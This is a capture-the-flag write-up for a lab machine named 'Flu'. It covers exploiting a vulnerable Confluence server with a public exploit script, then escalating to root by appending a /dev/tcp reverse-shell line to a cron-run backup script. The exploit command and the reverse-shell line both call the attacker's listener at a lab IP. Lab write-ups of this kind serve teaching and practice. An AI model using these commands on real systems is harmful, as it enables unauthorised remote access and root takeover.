# Flu

so i start off with a nmap scan to discover open ports:

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

The first web page:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We quickly see the version number of the confluence software so we can look for public exploits:

{% embed url="https://github.com/jbaines-r7/through_the_wire" %}

And we catch a shell just like that:

```
python3 through_the_wire.py --rhost 192.168.59.41 --rport 8090 --lhost 192.168.49.59 --lport 1234 --protocol http:// --reverse-shell
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i run linpeas and see that there is something going on in the dir /opt/atlassian/confluance/logs/

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i go and see all those files:

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

nothing interesting unfortunatly i went through all those logs and did not grep on any interesting stuff so i back out of this dir one by one and end up in /opt:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

the log-backup.sh file seems interesting:

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i see this script creates backups and stores them in a root folder so i try to write a reverse shell into it:

```
echo 'sh -i >& /dev/tcp/192.168.49.59/9876 0>&1' >> log-backup.sh
```

and very wierdly i get a shell as root on my listener?

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

so there must be a cron running on this file and i was very lucky so i need to be sure by running pspy to look at root to snoop on processes without need for root permissions. It allows to see commands run by other users, cron jobs, etc

so i install pspy in /tmp of my shell with the following:

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

and run it to find UID=0:

<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

* A script named **`/opt/log-backup.sh`** was run, likely as part of a scheduled task or system process.
* The initial execution (`/bin/sh -c ...`) suggests it may have been triggered by a **cron job**, systemd service, or another script.
* The script itself was executed using **`/bin/bash`**, meaning it contains commands that require Bash rather than the default `sh`.
